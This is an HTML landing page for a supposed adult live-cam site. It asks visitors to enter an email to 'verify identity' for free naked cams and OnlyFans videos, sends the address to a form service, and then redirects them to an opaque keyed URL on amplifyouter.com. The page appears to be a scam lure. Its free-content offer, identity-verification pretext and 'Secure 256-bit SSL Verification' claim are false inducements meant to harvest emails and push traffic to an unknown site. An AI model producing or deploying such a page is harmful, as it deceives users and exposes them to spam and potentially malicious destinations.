<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adult Entertainment | Live Chat & Exclusive Content</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #ff0040;
            --secondary-color: #0088cc;
            --glass-bg: rgba(0, 0, 0, 0.75);
            --border-glow: rgba(255, 0, 64, 0.3);
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            background-size: cover;
            background-position: center;
            transition: background-image 0.8s ease-in-out;
            overflow: hidden;
        }

        /* Overlay to darken background */
        .overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle, transparent 20%, #000 100%), 
                        linear-gradient(to bottom, rgba(0,0,0,0.3), rgba(0,0,0,0.8));
            z-index: 1;
        }

        .main-card {
            position: relative;
            z-index: 10;
            width: 90%;
            max-width: 420px;
            padding: 40px 30px;
            background: var(--glass-bg);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 30px var(--border-glow);
            text-align: center;
            color: #fff;
            animation: fadeIn 1s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo { font-size: 40px; color: var(--primary-color); margin-bottom: 10px; }
        
        h1 { font-size: 24px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
        
        .sub-text { font-size: 14px; color: #ccc; margin-bottom: 25px; line-height: 1.5; }

        .warning-tag {
            background: var(--primary-color);
            color: white;
            font-size: 11px;
            font-weight: bold;
            padding: 4px 10px;
            border-radius: 50px;
            display: inline-block;
            margin-bottom: 15px;
        }

        .input-group { margin-bottom: 20px; position: relative; }

        input[type="email"] {
            width: 100%;
            padding: 15px 15px 15px 45px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }

        input[type="email"]:focus { border-color: var(--primary-color); background: rgba(255, 255, 255, 0.1); }

        .input-group i { position: absolute; left: 15px; top: 17px; color: #777; }

        .btn-container { display: flex; flex-direction: column; gap: 12px; }

        .action-btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
        }

        .btn-live { background: var(--primary-color); color: white; box-shadow: 0 4px 15px rgba(255, 0, 64, 0.4); }
        .btn-live:hover { transform: scale(1.02); background: #e60039; }

        .btn-strip { background: transparent; border: 1px solid #fff; color: white; }
        .btn-strip:hover { background: white; color: black; }

        footer { margin-top: 25px; font-size: 11px; color: #666; }
    </style>
</head>
<body id="dynamic-bg">

    <div class="overlay"></div>

    <div class="main-card">
        <div class="warning-tag">18+ ADULTS ONLY</div>
        <div class="logo"><i class="fas fa-video"></i></div>
        <h1>Live Stream Access</h1>
        <p class="sub-text">Verify your identity to unlock free live cam chat and premium video archives.</p>

        <form id="access-form" action="https://formspree.io/f/your-form-id" method="POST">
            <div class="input-group">
                <i class="fas fa-envelope"></i>
                <input type="email" name="email" id="email" placeholder="Enter your email to verify..." required>
            </div>

            <div class="btn-container">
                <button type="submit" name="action" value="live" class="action-btn btn-live">
                    <i class="fas fa-camera"></i> Live Naked Cam FREE
                </button>
                <button type="submit" name="action" value="onlyfans" class="action-btn btn-strip">
                    <i class="fas fa-play-circle"></i> Onlyfans Videos FREE
                </button>
            </div>
        </form>

        <footer>
            By clicking enter, you agree to our Terms & Privacy Policy. <br>
            Secure 256-bit SSL Verification.
        </footer>
    </div>

    <script>
        // Professional Background Handling
        const bgImages = [
            'https://pbs.twimg.com/media/HAczyOeXMAEBMqU.jpg',
            'https://pbs.twimg.com/media/HBxCuBSaAAENdZs.jpg',
            'https://pbs.twimg.com/media/G-3O0FEXcAAFrO4.jpg',
            'https://pbs.twimg.com/media/F6GMWdlW8AA6BrS.jpg',
            'https://pbs.twimg.com/media/FZlw2e4VUAAsu1T.jpg',
            'https://pbs.twimg.com/media/GuvC0MpW8AA4-Y6.jpg',
            'https://pbs.twimg.com/media/GwgkaVuXUAMaXUT.jpg'
        ];

        function setRandomBG() {
            const randomImg = bgImages[Math.floor(Math.random() * bgImages.length)];
            document.getElementById('dynamic-bg').style.backgroundImage = `url('${randomImg}')`;
        }
        window.onload = setRandomBG;

        // Smart Redirect after form submission
        const redirectUrl = "https://amplifyouter.com/ajkh5vdhaj?key=f0d026c3e1fa72993bd9a1e8bfd1d25d";
        const form = document.getElementById('access-form');

        form.addEventListener('submit', function(e) {
            // If you want to use Formspree, don't use e.preventDefault()
            // But if you want instant redirect without waiting for email data:
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 500);
        });
    </script>
</body>
</html>
